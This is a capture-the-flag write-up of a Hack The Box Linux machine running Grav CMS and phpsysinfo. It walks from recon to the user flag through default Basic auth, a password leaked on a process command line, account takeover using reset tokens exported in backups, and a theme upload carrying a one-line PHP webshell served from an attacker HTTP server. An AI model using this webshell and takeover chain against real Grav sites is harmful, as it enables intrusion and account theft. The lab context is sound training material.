## Overview

Race is a hard-difficulty Linux machine built around **Grav CMS** and a **phpsysinfo** status page. The path to user chains four small mistakes: weak Basic-auth, a secret on a process command line, a backup feature that exports password-reset tokens, and a hard-coded credential in a script. The post covers recon → enumeration → foothold → `user.txt` and stops there.

## Recon

| Port | Service | Version |
|------|---------|---------|
| 22   | ssh     | OpenSSH 8.9p1 Ubuntu |
| 80   | http    | Apache 2.4.52 (Ubuntu) |

```bash
nmap -Pn -p- --min-rate=1000 -T4 10.129.234.209
nmap -Pn -p22,80 -sC -sV 10.129.234.209
```

Port 80 redirects to `/racers/` — a Grav CMS site. Directory brute-forcing surfaces two interesting endpoints:

```bash
feroxbuster -u http://10.129.234.209/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
```

- `/racers/admin` → Grav CMS login panel
- `/phpsysinfo` → prompts for HTTP Basic auth (401)

## Enumeration

### phpsysinfo behind weak Basic auth

The `/phpsysinfo` endpoint accepts the classic default `admin:admin`. Scrolling to the **Process Status** section reveals a running backup command with its credentials baked straight into the command line:

```bash
curl -s -u admin:admin "http://10.129.234.209/phpsysinfo/" | grep -iE 'curl|-u |backup'
```

That leaks the password for a `backup` Grav account — never put secrets on a command line, `ps` (and tools like phpsysinfo) expose them to everyone.

### Grav backup feature leaks a reset token

The leaked `backup:<redacted>` credentials log into `/racers/admin`. The account can't do much — except **take backups**. A backup is a ZIP of the entire site, including `user/accounts/*.yaml`, which holds each user's password hash, 2FA secret, and live password-reset token:

```bash
unzip -o backup.zip -d grav_bak
grep -rE 'hashed_password|reset:|twofa_secret' grav_bak/*/user/accounts/patrick.yaml
```

## Foothold

### Account takeover via the reset token

Cracking the bcrypt hash isn't necessary. Request a password reset for `patrick` to mint a **fresh** token, then immediately re-take the backup to read the updated `reset:` value — beating the real user to their own reset link:

```bash
# trigger a fresh token at /racers/admin/forgot, re-take backup, read patrick.yaml -> new token
curl -s "http://10.129.234.209/racers/admin/reset/u/patrick/<reset_token>"
```

Walk the reset link, set a new password, and log in as `patrick` — an account that can install themes and plugins.

### Malicious theme upload → RCE

The box has no internet access, so theme installs must go through a proxy. Clone a stock theme, drop a one-line PHP webshell into it, and host it:

```bash
git clone https://github.com/getgrav/grav-theme-photographer.git
echo '<?php echo system($_GET[0]); ?>' > grav-theme-photographer/img/cmd.php
zip -r pwn.zip grav-theme-photographer
python3 -m http.server 80
```

Point Grav's admin proxy at Burp (listening on all interfaces), click **Install**, and intercept the response — rewrite the `Location` header to point at the attacker's HTTP server serving `pwn.zip`. The theme installs with the webshell inside, giving command execution as `www-data`:

```bash
curl "http://10.129.234.209/racers/user/themes/aerial/img/cmd.php?0=id"
# uid=33(www-data) gid=33(www-data)
```

Catch a reverse shell for a proper foothold.

### Lateral to max — hard-coded password

From the `www-data` shell, the `max` home directory is readable and symlinks to a backup-scripts directory. One script hard-codes the `max` user's SSH password in a "disabled for security" comment:

```bash
cat /usr/local/share/race-scripts/offsite-backup.sh   # OFFSITE_PASS=<redacted>
sshpass -p '<redacted>' ssh -o StrictHostKeyChecking=no max@10.129.234.209
```

The password is `max`'s real login password — straight in over SSH.

## User flag

```bash
cat /home/max/user.txt   # HTB{...}
```

Access as `max` achieved.

> Foothold complete. Privilege escalation is left as an exercise — this post stops at user.
